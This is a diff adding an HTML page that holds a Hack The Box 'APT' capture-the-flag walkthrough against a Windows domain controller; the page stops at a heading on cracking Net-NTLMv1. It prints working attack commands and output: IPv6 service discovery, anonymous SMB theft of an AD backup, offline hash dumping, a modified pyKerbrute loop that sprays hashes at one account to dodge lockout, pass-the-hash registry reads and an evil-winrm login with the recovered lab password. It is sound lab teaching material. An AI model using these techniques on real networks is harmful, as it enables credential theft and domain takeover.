@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: APT — QA210</title>
+<meta name="description" content="Hack The Box APT — Insane difficulty Windows Domain Controller walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F578;</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #1c2333;
+  --bg-code: #0d1117;
+  --border: #30363d;
+  --border-light: #21262d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #6e7681;
+  --accent-green: #3fb950;
+  --accent-blue: #58a6ff;
+  --accent-red: #f85149;
+  --accent-yellow: #d29922;
+  --accent-purple: #bc8cff;
+  --accent-orange: #f0883e;
+  --accent-cyan: #39d353;
+  --link: #58a6ff;
+  --link-hover: #79c0ff;
+  --scrollbar-thumb: #30363d;
+  --scrollbar-track: #161b22;
+  --toc-active: #f85149;
+  --callout-info-bg: rgba(56,139,253,0.1);
+  --callout-info-border: #388bfd;
+  --callout-warn-bg: rgba(210,153,34,0.1);
+  --callout-warn-border: #d29922;
+  --callout-danger-bg: rgba(248,81,73,0.1);
+  --callout-danger-border: #f85149;
+  --callout-success-bg: rgba(63,185,80,0.1);
+  --callout-success-border: #3fb950;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html {
+  scroll-behavior: smooth;
+  scrollbar-width: thin;
+  scrollbar-color: var(--scrollbar-thumb) var(--scrollbar-track);
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.75;
+  font-size: 16px;
+}
+
+#three-bg {
+  position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+  z-index: -1; pointer-events: none; opacity: 0.3;
+}
+
+::-webkit-scrollbar { width:8px; height:8px; }
+::-webkit-scrollbar-track { background:var(--scrollbar-track); }
+::-webkit-scrollbar-thumb { background:var(--scrollbar-thumb); border-radius:4px; }
+::-webkit-scrollbar-thumb:hover { background:#484f58; }
+
+a { color:var(--link); text-decoration:none; transition:color .2s; }
+a:hover { color:var(--link-hover); }
+
+.site-header {
+  position:sticky; top:0; z-index:100;
+  background:rgba(13,17,23,0.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;
+  height:56px;
+  display:flex; align-items:center; justify-content:space-between;
+}
+.site-header .logo {
+  font-family:'JetBrains Mono',monospace;
+  font-weight:700; font-size:1.15rem;
+  color:var(--accent-green);
+  display:flex; align-items:center; gap:8px;
+}
+.site-header .logo .dot { color:var(--accent-red); }
+.site-header nav { display:flex; gap:1.5rem; align-items:center; }
+.site-header nav a { color:var(--text-secondary); font-size:.875rem; font-weight:500; }
+.site-header nav a:hover { color:var(--text-primary); }
+
+.hamburger { display:none; background:none; border:none; color:var(--text-primary); cursor:pointer; font-size:1.5rem; }
+
+.page-layout {
+  display:grid;
+  grid-template-columns:260px 1fr;
+  max-width:1400px;
+  margin:0 auto;
+  min-height:calc(100vh - 56px);
+}
+
+.toc-sidebar {
+  position:sticky; top:56px;
+  height:calc(100vh - 56px);
+  overflow-y:auto;
+  padding:1.5rem 1rem 1.5rem 1.5rem;
+  border-right:1px solid var(--border);
+  background:var(--bg-primary);
+}
+.toc-sidebar h3 { font-size:.75rem; text-transform:uppercase; letter-spacing:.08em; color:var(--text-muted); margin-bottom:.75rem; font-weight:600; }
+.toc-sidebar ul { list-style:none; }
+.toc-sidebar li { margin-bottom:2px; }
+.toc-sidebar a { display:block; padding:4px 8px; border-radius:4px; font-size:.8rem; color:var(--text-secondary); transition:all .15s; line-height:1.4; }
+.toc-sidebar a:hover { color:var(--text-primary); background:var(--bg-secondary); }
+.toc-sidebar a.active { color:var(--toc-active); background:rgba(248,81,73,0.1); font-weight:600; }
+.toc-sidebar .toc-h3 { padding-left:18px; font-size:.75rem; }
+
+.main-content { padding:2.5rem 3rem 4rem; max-width:860px; width:100%; }
+
+.page-hero { margin-bottom:2.5rem; padding-bottom:2rem; border-bottom:1px solid var(--border); }
+.page-hero .box-badge { display:inline-block; background:var(--accent-red); color:#fff; font-size:.7rem; font-weight:700; padding:2px 10px; border-radius:12px; text-transform:uppercase; letter-spacing:.05em; margin-bottom:.75rem; }
+.page-hero h1 { font-size:2.25rem; font-weight:800; margin-bottom:.5rem; letter-spacing:-.02em; }
+.page-hero .meta { color:var(--text-secondary); font-size:.875rem; display:flex; flex-wrap:wrap; gap:.75rem; align-items:center; }
+.page-hero .meta .sep { color:var(--text-muted); }
+
+.breadcrumbs { font-size:.75rem; color:var(--text-muted); margin-bottom:1rem; font-family:'JetBrains Mono',monospace; }
+.breadcrumbs a { color:var(--text-secondary); }
+.breadcrumbs a:hover { color:var(--link); }
+.breadcrumbs .sep { margin:0 .4rem; }
+
+.box-info-card { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin-bottom:2rem; display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:1rem; }
+.box-info-card .info-item .label { font-size:.7rem; text-transform:uppercase; letter-spacing:.06em; color:var(--text-muted); margin-bottom:2px; font-weight:600; }
+.box-info-card .info-item .value { font-size:.95rem; font-weight:600; color:var(--text-primary); }
+
+.main-content h2 { font-size:1.6rem; font-weight:800; margin:2.5rem 0 1rem; padding-bottom:.4rem; border-bottom:2px solid var(--border); letter-spacing:-.01em; scroll-margin-top:70px; }
+.main-content h3 { font-size:1.15rem; font-weight:700; margin:1.75rem 0 .75rem; color:var(--text-primary); scroll-margin-top:70px; }
+.main-content h4 { font-size:1rem; font-weight:600; margin:1.25rem 0 .5rem; color:var(--text-secondary); }
+.main-content p { margin-bottom:1rem; color:var(--text-secondary); line-height:1.8; }
+
+.code-block-wrapper { position:relative; margin:1rem 0 1.25rem; border-radius:8px; overflow:hidden; border:1px solid var(--border); }
+.code-block-header { display:flex; justify-content:space-between; align-items:center; padding:6px 14px; background:var(--bg-tertiary); border-bottom:1px solid var(--border); font-size:.72rem; color:var(--text-muted); font-family:'JetBrains Mono',monospace; }
+.code-block-header .lang-label { text-transform:uppercase; font-weight:600; letter-spacing:.04em; }
+.copy-btn { background:none; border:1px solid var(--border); color:var(--text-muted); font-size:.7rem; padding:2px 10px; border-radius:4px; cursor:pointer; font-family:'JetBrains Mono',monospace; transition:all .2s; }
+.copy-btn:hover { color:var(--text-primary); border-color:var(--text-muted); }
+.copy-btn.copied { color:var(--accent-green); border-color:var(--accent-green); }
+.code-block-wrapper pre { margin:0!important; padding:1rem!important; background:var(--bg-code)!important; font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; line-height:1.6!important; overflow-x:auto; }
+.code-block-wrapper code { font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; }
+
+p code, li code { background:var(--bg-tertiary); border:1px solid var(--border); padding:1px 6px; border-radius:4px; font-family:'JetBrains Mono',monospace; font-size:.82em; color:var(--accent-orange); }
+
+.callout { padding:.85rem 1rem; border-radius:6px; border-left:3px solid; margin:1rem 0 1.25rem; font-size:.9rem; }
+.callout p { margin:0; color:var(--text-secondary); }
+.callout-title { font-weight:700; font-size:.8rem; text-transform:uppercase; letter-spacing:.04em; margin-bottom:4px; }
+.callout-info { background:var(--callout-info-bg); border-color:var(--callout-info-border); }
+.callout-info .callout-title { color:var(--callout-info-border); }
+.callout-warn { background:var(--callout-warn-bg); border-color:var(--callout-warn-border); }
+.callout-warn .callout-title { color:var(--callout-warn-border); }
+.callout-danger { background:var(--callout-danger-bg); border-color:var(--callout-danger-border); }
+.callout-danger .callout-title { color:var(--callout-danger-border); }
+.callout-success { background:var(--callout-success-bg); border-color:var(--callout-success-border); }
+.callout-success .callout-title { color:var(--callout-success-border); }
+
+.attack-path { background:var(--bg-secondary); border:1px solid var(--border); border-radius:8px; padding:1.25rem 1.5rem; margin:1.5rem 0; font-family:'JetBrains Mono',monospace; font-size:.78rem; line-height:1.7; overflow-x:auto; }
+.attack-path .step { display:flex; align-items:baseline; gap:.5rem; margin-bottom:.25rem; }
+.attack-path .arrow { color:var(--accent-green); }
+.attack-path .host { color:var(--accent-cyan); font-weight:700; }
+.attack-path .technique { color:var(--accent-orange); }
+.attack-path .cred { color:var(--accent-purple); }
+
+.main-content ul, .main-content ol { margin:.5rem 0 1rem 1.5rem; color:var(--text-secondary); }
+.main-content li { margin-bottom:.35rem; line-height:1.7; }
+
+.main-content table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:.85rem; }
+.main-content th, .main-content td { padding:8px 12px; border:1px solid var(--border); text-align:left; }
+.main-content th { background:var(--bg-secondary); font-weight:600; color:var(--text-primary); font-size:.75rem; text-transform:uppercase; letter-spacing:.04em; }
+.main-content td { color:var(--text-secondary); }
+
+.site-footer { border-top:1px solid var(--border); padding:1.5rem 2rem; text-align:center; color:var(--text-muted); font-size:.8rem; }
+
+.toc-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:200; }
+.toc-overlay.show { display:block; }
+.toc-mobile-panel { display:none; position:fixed; left:0; top:0; bottom:0; width:280px; background:var(--bg-primary); border-right:1px solid var(--border); z-index:201; overflow-y:auto; padding:1.5rem; }
+.toc-mobile-panel.show { display:block; }
+.toc-mobile-panel .close-btn { background:none; border:none; color:var(--text-secondary); font-size:1.2rem; cursor:pointer; float:right; }
+
+@media (max-width:1024px) {
+  .page-layout { grid-template-columns:1fr; }
+  .toc-sidebar { display:none; }
+  .hamburger { display:block; }
+  .main-content { padding:1.5rem 1.25rem 3rem; }
+  .page-hero h1 { font-size:1.75rem; }
+}
+@media (max-width:640px) {
+  .site-header { padding:0 1rem; }
+  .main-content { padding:1rem .75rem 2rem; }
+  .page-hero h1 { font-size:1.4rem; }
+  .box-info-card { grid-template-columns:1fr 1fr; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/insane/">HTB</a>
+    <a href="#">Tools</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Table of Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs">
+    <a href="/">Home</a><span class="sep">/</span>
+    <a href="/htb/insane/">HTB Insane</a><span class="sep">/</span>
+    APT
+  </div>
+  <span class="box-badge">Insane</span>
+  <h1>HTB: APT</h1>
+  <div class="meta">
+    <span>QA210</span>
+    <span class="sep">&middot;</span>
+    <span>Apr 2021</span>
+    <span class="sep">&middot;</span>
+    <span>Windows DC &middot; IPv6 &middot; Net-NTLMv1</span>
+  </div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Box</div><div class="value">APT</div></div>
+  <div class="info-item"><div class="label">Difficulty</div><div class="value" style="color:var(--accent-red)">Insane</div></div>
+  <div class="info-item"><div class="label">OS</div><div class="value">Windows</div></div>
+  <div class="info-item"><div class="label">Creator</div><div class="value">cube0x0</div></div>
+  <div class="info-item"><div class="label">Domain</div><div class="value">htb.local</div></div>
+  <div class="info-item"><div class="label">Key Tech</div><div class="value">IOXIDResolver / NTLMv1</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">APT</span> <span class="arrow">&rarr;</span> RPC IOXIDResolver <span class="arrow">&rarr;</span> <span class="cred">IPv6 address</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> IPv6 nmap <span class="arrow">&rarr;</span> <span class="technique">SMB backup share</span> <span class="arrow">&rarr;</span> <span class="cred">backup.zip</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> Crack zip <span class="arrow">&rarr;</span> secretsdump <span class="arrow">&rarr;</span> <span class="cred">2000 NTLM hashes</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> kerbrute <span class="arrow">&rarr;</span> <span class="cred">henry.vinson</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> pyKerbrute hash spray <span class="arrow">&rarr;</span> <span class="cred">henry.vinson valid hash</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> Remote Registry HKCU <span class="arrow">&rarr;</span> <span class="cred">henry.vinson_adm:G1#Ny5@2dvht</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> WinRM <span class="arrow">&rarr;</span> <span class="technique">lmcompatibilitylevel=2 (NTLMv1)</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> Capture Net-NTLMv1 (Defender/RoguePotato) <span class="arrow">&rarr;</span> crack.sh <span class="arrow">&rarr;</span> <span class="cred">APT$ NT hash</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> secretsdump with APT$ hash <span class="arrow">&rarr;</span> <span class="cred">Administrator</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Recon</h2>
+
+<h3 id="recon-nmap">Initial Nmap Scan</h3>
+<p>The initial TCP scan reveals an extremely limited attack surface. Only two ports are open: HTTP on port 80 and MSRPC on port 135. There are no signs of SMB (445), LDAP (389), Kerberos (88), or WinRM (5985) that would typically indicate a Windows Domain Controller. This sparse result immediately suggests that the host is heavily firewalled on IPv4 and that we will need to find an alternative access vector to reach the full suite of Windows services.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.213
+PORT    STATE SERVICE
+80/tcp  open  http
+135/tcp open  msrpc</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -p 80,135 -sCV 10.10.10.213
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Gigantic Hosting | Home
+135/tcp open  msrpc   Microsoft Windows RPC</code></pre>
+</div>
+
+<h3 id="recon-web">Website &mdash; TCP 80</h3>
+<p>The website belongs to a hosting company called "Gigantic Hosting." The site is static with a contact form that submits to an internal IP address (<code>10.13.38.16</code>), which is a leftover from the HTB Endgame Hades environment. A comment in the HTML source confirms it was mirrored using HTTrack Website Copier. Directory brute-forcing with Feroxbuster yields nothing useful, and the site does not contain any exploitable vulnerabilities. This is a dead end &mdash; the real attack path lies through RPC.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="ipv6-discovery">IPv6 Discovery via IOXIDResolver</h2>
+
+<h3 id="rpc-enum">RPC Endpoint Enumeration</h3>
+<p>TCP port 135 hosts the RPC Endpoint Mapper and COM Service Control Manager. Using <code>rpcmap.py</code> from Impacket with a direct TCP string binding, we can enumerate the RPC endpoints registered on the host. Among the results, the IObjectExporter interface (UUID <code>99FCFEC4-5260-101B-BBCB-00AA0021347A</code>) stands out &mdash; this is the IOXIDResolver interface, famously used in the Potato family of privilege escalation exploits.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ rpcmap.py 'ncacn_ip_tcp:10.10.10.213'
+Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
+Provider: rpcss.dll
+UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</code></pre>
+</div>
+
+<h3 id="ioxidresolver">Enumerating Network Interfaces</h3>
+<p>The IOXIDResolver interface exposes a method called <code>ServerAlive2</code> that returns the network bindings of the host, including IPv6 addresses. This is a well-documented technique that allows unauthenticated enumeration of a server's network interfaces. Using a POC script based on the research from airbus-seclab, we can query this interface and retrieve the IPv6 addresses of the target.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 IOXIDResolver.py -t 10.10.10.213
+[*] Retrieving network interface of 10.10.10.213
+Address: apt
+Address: 10.10.10.213
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::9514:421b:5cde:a7da</code></pre>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Key Insight &mdash; IPv6 Bypasses Firewall</div>
+  <p>The Windows Firewall on APT is configured to block most incoming IPv4 connections, but the IPv6 interface is far more permissive. By scanning the IPv6 address, we can access the full range of Windows Domain Controller services that are hidden behind the IPv4 firewall. This is a common misconfiguration in enterprise environments where IPv6 security is neglected in favor of IPv4-focused firewall rules.</p>
+</div>
+
+<h3 id="ipv6-nmap">Full Port Scan over IPv6</h3>
+<p>Scanning the discovered IPv6 address reveals a dramatically different attack surface. The host is clearly a Windows Domain Controller running DNS, Kerberos, LDAP, SMB, and WinRM &mdash; all the services we would expect from a DC, but none of which were accessible over IPv4.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV dead:beef::b885:d62a:d679:573f
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393
+636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (SSL)
+3268/tcp open  globalcatLDAP
+5985/tcp open  wsman        WinRM
+9389/tcp open  adws         .NET Message Framing</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="smb-backup">SMB &mdash; Backup Share</h2>
+
+<p>With SMB accessible over IPv6, we can enumerate shares anonymously. CrackMapExec (with IPv6 support from version 5.1.6dev) or smbclient both reveal a share named <code>backup</code> with READ permissions for anonymous users. This share contains a single file: <code>backup.zip</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ smbclient '\\\\dead:beef::b885:d62a:d679:573f\\backup'
+Anonymous login successful
+smb: \> dir
+  backup.zip        A 10650961  Thu Sep 24 03:30:32 2020
+smb: \> get backup.zip</code></pre>
+</div>
+
+<p>The ZIP file contains a backup of an Active Directory environment &mdash; specifically the <code>ntds.dit</code> database and the registry <code>SYSTEM</code> and <code>SECURITY</code> hives. These are the exact files needed to dump all AD credentials offline using tools like <code>secretsdump.py</code>. However, the archive is password-protected.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ unzip -l backup.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+ 50331648  2020-09-23 19:38   Active Directory/ntds.dit
+    16384  2020-09-23 19:38   Active Directory/ntds.jfm
+   262144  2020-09-23 19:22   registry/SECURITY
+ 12582912  2020-09-23 19:22   registry/SYSTEM</code></pre>
+</div>
+
+<h3 id="crack-zip">Cracking the ZIP Password</h3>
+<p>Using <code>zip2john</code> to extract the hash and <code>hashcat</code> with mode 17220 (PKZIP Compressed Multi-File), the password cracks quickly from the RockYou wordlist:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ zip2john backup.zip > backup.zip.hash
+$ hashcat -m 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt --user
+...iloveyousomuch</code></pre>
+</div>
+
+<h3 id="dump-hashes">Dumping AD Hashes</h3>
+<p>With the ZIP decrypted, <code>secretsdump.py</code> can extract all NTLM hashes from the offline AD database. The dump contains approximately 2000 user accounts with their corresponding hashes &mdash; a treasure trove of potential credentials, but we need to determine which of these accounts still exist on the live system.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ secretsdump.py -system registry/SYSTEM -ntds "Active Directory/ntds.dit" LOCAL > backup_ad_dump
+$ grep ':::' backup_ad_dump | wc -l
+2000</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Important &mdash; Backup vs. Live AD</div>
+  <p>The backup represents a snapshot of the AD environment at a previous point in time. Most of the 2000 users from the backup may no longer exist on the current live domain. The Administrator hash from the backup does not work against the live system, confirming that passwords have been changed since the backup was created. We need to find accounts that exist in both the backup and the live AD.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="user-discovery">User Discovery via Kerbrute</h2>
+
+<p>Since Kerberos is available on IPv6 (TCP 88), we can use <strong>kerbrute</strong> to enumerate valid usernames against the live domain. Kerbrute sends AS-REQ requests and distinguishes between "user not found" errors and "pre-auth required" responses, which indicates a valid account. We extract the list of 2000 usernames from the backup dump and test them all.</p>
+
+<p>Getting kerbrute to work with IPv6 requires adding the IPv6 address to <code>/etc/hosts</code> mapped to <code>apt.htb</code> and <code>htb.local</code>, then specifying the domain controller hostname rather than a raw IPv6 address.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ kerbrute userenum -d apt.htb --dc apt.htb users
+2021/04/02 13:54:51 > [+] VALID USERNAME:       APT$@htb.local
+2021/04/02 13:54:52 > [+] VALID USERNAME:       Administrator@htb.local
+2021/04/02 13:58:39 > [+] VALID USERNAME:       henry.vinson@htb.local
+2021/04/02 14:11:40 > Done! Tested 2000 usernames (3 valid)</code></pre>
+</div>
+
+<p>Out of 2000 users from the backup, only <strong>henry.vinson</strong> is a valid non-system account on the live domain. This is our target &mdash; but the NTLM hash from the backup does not work for this account on the live system, meaning the password has been changed.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="kerberos-hash-brute">Kerberos Hash Brute Force</h2>
+
+<h3 id="smb-blocked">SMB Brute Force Blocked by Wail2Ban</h3>
+<p>The logical next step is password reuse: try all 2000 NTLM hashes from the backup against the single valid username <code>henry.vinson</code>. However, attempting this over SMB with CrackMapExec triggers a brute-force protection mechanism called <strong>wail2ban</strong> installed on the host. After approximately 60 failed authentication attempts, the box stops responding entirely to SMB connections from our IP, requiring a box reset to regain access. This forces us to find an alternative authentication channel.</p>
+
+<h3 id="pykerbrute-mod">Modified pyKerbrute</h3>
+<p>Kerberos pre-authentication provides an ideal alternative channel. The idea is to test each hash from the backup as a Kerberos encryption key for <code>henry.vinson</code>. If the hash is correct, the AS-REQ will be accepted (or at least not return a pre-auth failure), confirming the credential. <code>pyKerbrute</code> is close to what we need &mdash; it accepts a list of users and a single hash &mdash; but we need the inverse: a single user with a list of hashes. We modify the main loop to iterate over hashes instead of usernames, calling the existing <code>passwordspray_tcp</code> function for each one.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">if __name__ == '__main__':
+    kdc_a = sys.argv[1]
+    user_realm = sys.argv[2].upper()
+    username = sys.argv[3]
+
+    print('[*] DomainControlerAddr: %s' % kdc_a)
+    print('[*] DomainName:          %s' % user_realm)
+    print('[*] Username:            %s' % username)
+    print('[*] Using TCP to test a single username with list of hashes.')
+
+    with open(sys.argv[4], 'r') as f:
+        ntlm_list = list(map(str.strip, f.readlines()))
+
+    for h in ntlm_list:
+        user_key = (RC4_HMAC, h.decode('hex'))
+        passwordspray_tcp(user_realm, username, user_key, kdc_a, h)</code></pre>
+</div>
+
+<p>Running the modified script against the full hash list finds a valid credential:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python2 kerbBruteHash.py apt.htb htb.local henry.vinson hashes-ntlm
+[*] DomainControlerAddr: apt.htb
+[*] DomainName:          HTB.LOCAL
+[*] Username:            henry.vinson
+[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb</code></pre>
+</div>
+
+<div class="callout callout-success">
+  <div class="callout-title">Valid Credential Found</div>
+  <p><code>henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb</code> &mdash; One of the 2000 hashes from the backup still works for this user on the live domain. This is a password reuse finding: the user's NTLM hash was not changed when the AD was rebuilt.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-henry">Shell as henry.vinson_adm</h2>
+
+<h3 id="remote-registry">Remote Registry Discovery</h3>
+<p>With valid NTLM credentials for henry.vinson, we can access the remote registry. Using either the Windows API from a Windows attack station (via Mimikatz pass-the-hash) or Impacket's <code>reg.py</code> from Linux, we can enumerate registry keys. While HKLM access is denied, HKCU (the current user's hive) is accessible because henry.vinson has an active session on the host.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb \
+    -dc-ip htb.local htb.local/henry.vinson@htb.local query \
+    -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
+
+HKU\SOFTWARE\GiganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht</code></pre>
+</div>
+
+<p>The registry key <code>HKU\SOFTWARE\GiganticHostingManagementSystem</code> stores credentials for the <code>henry.vinson_adm</code> account &mdash; an administrative account with the password <code>G1#Ny5@2dvht</code>. The <code>_adm</code> suffix strongly suggests elevated privileges, and this account has WinRM access.</p>
+
+<h3 id="winrm-access">WinRM Shell</h3>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'
+Evil-WinRM shell v2.4
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents></code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="privilege-escalation">Privilege Escalation &mdash; Net-NTLMv1</h2>
+
+<h3 id="ps-history">PowerShell History Hint</h3>
+<p>Enumeration of the henry.vinson_adm account reveals a PowerShell history file that contains a critical hint:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">PS> cat C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline\ConsoleHost_history.txt
+$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}</code></pre>
+</div>
+
+<p>This command sets <code>LmCompatibilityLevel</code> to 2, which means the server accepts NTLMv1 authentication. NTLMv1 is cryptographically weak and can be cracked using rainbow tables. Verifying the current setting on the host confirms it is still set to 2:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">PS> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel
+lmcompatibilitylevel : 2</code></pre>
+</div>
+
+<h3 id="ntlmv1-strategy">Strategy &mdash; Cracking Net-NTLMv1</h3>
